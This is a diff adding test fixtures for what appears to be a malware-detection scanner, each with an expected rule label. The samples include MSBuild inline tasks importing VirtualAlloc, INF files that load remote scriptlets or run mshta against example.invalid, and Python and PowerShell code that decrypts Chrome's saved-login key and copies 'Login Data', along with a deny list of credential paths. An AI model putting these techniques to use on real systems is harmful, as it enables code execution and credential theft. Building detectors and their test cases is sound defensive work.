@@ -463,5 +463,72 @@
     "name": "finger_query.txt",
     "text": "finger alice@example.invalid prints the user's .plan file (RFC 1288).\n",
     "expected": null
+  },
+  {
+    "name": "msbuild_inline.csproj",
+    "text": "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Build\"><Inert /></Target>\n  <UsingTask TaskName=\"Inert\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task><Code Type=\"Class\" Language=\"cs\"><![CDATA[\n[DllImport(\"kernel32\")] static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);\n]]></Code></Task>\n  </UsingTask>\n</Project>\n",
+    "expected": "win_msbuild_inline_task"
+  },
+  {
+    "name": "msbuild_inline_utf16.bin",
+    "text": "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Build\"><Inert /></Target>\n  <UsingTask TaskName=\"Inert\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task><Code Type=\"Class\" Language=\"cs\"><![CDATA[\n[DllImport(\"kernel32\")] static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);\n]]></Code></Task>\n  </UsingTask>\n</Project>\n",
+    "expected": "win_msbuild_inline_task",
+    "encoding": "utf-16"
+  },
+  {
+    "name": "msbuild_inline_zip.zip",
+    "text": "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Build\"><Inert /></Target>\n  <UsingTask TaskName=\"Inert\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task><Code Type=\"Class\" Language=\"cs\"><![CDATA[\n[DllImport(\"kernel32\")] static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);\n]]></Code></Task>\n  </UsingTask>\n</Project>\n",
+    "expected": "win_msbuild_inline_task",
+    "container": "zip"
+  },
+  {
+    "name": "msbuild_git_version_benign.targets",
+    "text": "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Build\"><Inert /></Target>\n  <UsingTask TaskName=\"Inert\" TaskFactory=\"RoslynCodeTaskFactory\" AssemblyFile=\"$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task><Code Type=\"Class\" Language=\"cs\"><![CDATA[\nvar p = Process.Start(\"git\", \"rev-parse HEAD\"); Log.LogMessage(p.StandardOutput.ReadToEnd());\n]]></Code></Task>\n  </UsingTask>\n</Project>\n",
+    "expected": null
+  },
+  {
+    "name": "inf_scriptlet.inf",
+    "text": "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall_SingleUser]\r\nUnRegisterOCXs=UnRegisterOCXSection\r\n\r\n[UnRegisterOCXSection]\r\n%11%\\scrobj.dll,NI,https://example.invalid/inert.sct\r\n\r\n[Strings]\r\nServiceName=\"Inert\"\r\n",
+    "expected": "win_inf_scriptlet_install"
+  },
+  {
+    "name": "inf_presetup.inf",
+    "text": "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\nc:\\windows\\system32\\mshta.exe https://example.invalid/inert.hta\r\ntaskkill /IM cmstp.exe /F\r\n",
+    "expected": [
+      "script_mshta_remote",
+      "win_inf_scriptlet_install"
+    ]
+  },
+  {
+    "name": "inf_scriptlet_utf16le.bin",
+    "text": "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall_SingleUser]\r\nUnRegisterOCXs=UnRegisterOCXSection\r\n\r\n[UnRegisterOCXSection]\r\n%11%\\scrobj.dll,NI,https://example.invalid/inert.sct\r\n\r\n[Strings]\r\nServiceName=\"Inert\"\r\n",
+    "expected": "win_inf_scriptlet_install",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "inf_cm_profile_benign.inf",
+    "text": "[Version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5, \"You need a newer version of advpack.dll\"\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\nCopyFiles=Xnstall.CopyFiles\r\n\r\n[RunPreSetupCommandsSection]\r\n; Uninstall an earlier profile\r\ncmmgr32.exe /s /u Inert.inf\r\n\r\n[Xnstall.CopyFiles]\r\nInert.cms\r\n",
+    "expected": null
+  },
+  {
+    "name": "inf_driver_benign.inf",
+    "text": "[Version]\r\nSignature=\"$Windows NT$\"\r\nClass=Ports\r\n\r\n[Manufacturer]\r\n%Mfg%=Inert,NTamd64\r\n[Inert.NTamd64]\r\n%Desc%=InertInstall,USB\\VID_0000&PID_0000\r\n",
+    "expected": null
+  },
+  {
+    "name": "browser_decrypt.py",
+    "text": "import os, json, base64, win32crypt\nstate = json.load(open(os.path.join(root, 'Local State')))\nkey = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]\nkey = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]\ndb = os.path.join(root, 'Default', 'Login Data')\n",
+    "expected": "win_browser_credential_decrypt"
+  },
+  {
+    "name": "browser_decrypt_gzip.gz",
+    "text": "$state = Get-Content \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State\" | ConvertFrom-Json\n$k = [Convert]::FromBase64String($state.os_crypt.app_bound_encrypted_key)\n$d = [Security.Cryptography.ProtectedData]::Unprotect($k, $null, 'CurrentUser')\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" $env:TEMP\\ld\n",
+    "expected": "win_browser_credential_decrypt",
+    "container": "gzip"
+  },
+  {
+    "name": "browser_paths_benign.json",
+    "text": "{\"deny\": [\"Chrome/Default/Login Data\", \"Local State\", \"encrypted_key\", \"key4.db\"]}",
+    "expected": null
   }
 ]
